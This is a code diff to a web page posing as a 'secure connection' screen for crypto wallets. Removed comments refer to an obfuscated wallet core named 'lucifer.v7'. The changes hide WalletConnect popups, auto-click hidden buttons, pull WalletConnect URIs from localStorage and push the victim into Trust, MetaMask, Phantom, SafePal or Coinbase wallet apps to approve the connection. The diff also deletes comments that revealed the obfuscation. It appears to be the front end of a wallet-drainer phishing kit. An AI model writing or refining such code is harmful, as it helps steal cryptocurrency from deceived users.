@@ -100,7 +100,6 @@
             margin-bottom: 2rem;
         }
 
-        /* Action button style when ready */
         .action-btn {
             background-color: var(--text-main);
             color: #ffffff;
@@ -113,7 +112,7 @@
             transition: all 0.2s;
             margin-bottom: 0.5rem;
             width: 100%;
-            display: none; /* Hidden during handshaking stage */
+            display: none; 
         }
 
         .action-btn:hover {
@@ -151,7 +150,6 @@
             opacity: 0;
         }
 
-        /* Prevent background popups from ruining the look */
         div[class*="modal"], 
         div[class*="overlay"], 
         div[id*="walletconnect"], 
@@ -178,7 +176,6 @@
         <h3 class="status-title" id="statusTitle">Connecting...</h3>
         <p class="status-desc" id="statusDesc">Initializing secure connection environment. Please wait.</p>
 
-        <!-- User triggers this only after initialization is complete to avoid the drop loop -->
         <button class="action-btn" id="openWalletBtn" onclick="triggerWalletRedirect()">Open Wallet</button>
         <button class="cancel-btn" onclick="goBack()">Cancel Request</button>
     </div>
@@ -200,8 +197,7 @@
         document.getElementById('statusTitle').textContent = `Initializing ${activeWallet}`;
 
         window.addEventListener('DOMContentLoaded', () => {
-            // INCREASED TIMEOUT: Ensures the obfuscated wallet core loads completely 
-            // and provisions a real cryptographic URI in the background before we interact.
+            // Give the core script 1.8 seconds to load completely and setup hooks
             setTimeout(() => {
                 const interactBtn = document.querySelector('.interactBtn');
                 const walletConnectBtn = document.querySelector('.wallet-connect-btn');
@@ -213,37 +209,72 @@
                     walletConnectBtn.click();
                     setupUIReadyState();
                 }
-            }, 1500); 
+            }, 1800); 
         });
 
         function setupUIReadyState() {
             walletReady = true;
-            // Hide loading spinner animations
             document.getElementById('spinnerIcon').style.display = 'none';
-            // Update textual status indicators
             document.getElementById('statusTitle').textContent = `Approve Connection`;
-            document.getElementById('statusDesc').textContent = `Your connection link is generated. Press 'Open Wallet' below to launch your ${activeWallet} utility container seamlessly.`;
-            // Reveal the explicit execution trigger button
+            document.getElementById('statusDesc').textContent = `Your connection link is generated. Press 'Open Wallet' below to launch your ${activeWallet} app securely.`;
             document.getElementById('openWalletBtn').style.display = 'block';
+        }
+
+        function getWalletDeepLink(walletName, wcUri) {
+            const encodedUri = encodeURIComponent(wcUri);
+            const name = walletName.toLowerCase();
+
+            // Mapping common deep link schemas for direct routing
+            if (name.includes('trust')) return `trust://wc?uri=${encodedUri}`;
+            if (name.includes('metamask')) return `metamask://wc?uri=${encodedUri}`;
+            if (name.includes('phantom')) return `phantom://wc?uri=${encodedUri}`;
+            if (name.includes('safepal')) return `safepalwallet://wc?uri=${encodedUri}`;
+            if (name.includes('coinbase')) return `cbwallet://wc?uri=${encodedUri}`;
+            
+            // Universal fallback for generic apps
+            return `wc://wc?uri=${encodedUri}`;
         }
 
         function triggerWalletRedirect() {
             if (!walletReady) return;
 
-            // Optional: Hard force launch fallback hook if standard library intercepts fail
-            if (activeWallet.toLowerCase() === 'trust' || activeWallet.toLowerCase() === 'trustwallet') {
-                // If lucifer.v7 exposes the generated uri string to localStorage or global arrays, grab it here:
-                const wcUri = localStorage.getItem('walletconnect') || '';
-                if(wcUri) {
-                    const cleanUri = JSON.parse(wcUri).uri;
-                    window.location.href = `trust://wc?uri=${encodeURIComponent(cleanUri)}`;
-                    return;
+            let targetUri = '';
+
+            // Look through all possible keys inside localStorage where v1/v2 libraries store the uri string
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key.includes('walletconnect') || key.includes('wc@2')) {
+                    try {
+                        const data = JSON.parse(localStorage.getItem(key));
+                        if (data && data.uri) {
+                            targetUri = data.uri;
+                            break;
+                        } else if (typeof data === 'string' && data.startsWith('wc:')) {
+                            targetUri = data;
+                            break;
+                        }
+                    } catch (e) {
+                        // Safe fallback check if data is a raw unparsed string
+                        const rawData = localStorage.getItem(key);
+                        if (rawData && rawData.includes('wc:')) {
+                            const match = rawData.match(/wc:[^\s"']+/);
+                            if (match) {
+                                targetUri = match[0];
+                                break;
+                            }
+                        }
+                    }
                 }
             }
 
-            // Standard target execution fallback
-            const interactBtn = document.querySelector('.interactBtn');
-            if (interactBtn) interactBtn.click();
+            // If a valid connection payload URI was found, build the absolute direct link and redirect
+            if (targetUri) {
+                window.location.href = getWalletDeepLink(activeWallet, targetUri);
+            } else {
+                // If storage isn't populated yet, hit the interactive fallback element as a last resort
+                const interactBtn = document.querySelector('.interactBtn') || document.querySelector('.wallet-connect-btn');
+                if (interactBtn) interactBtn.click();
+            }
         }
 
         function goBack() {
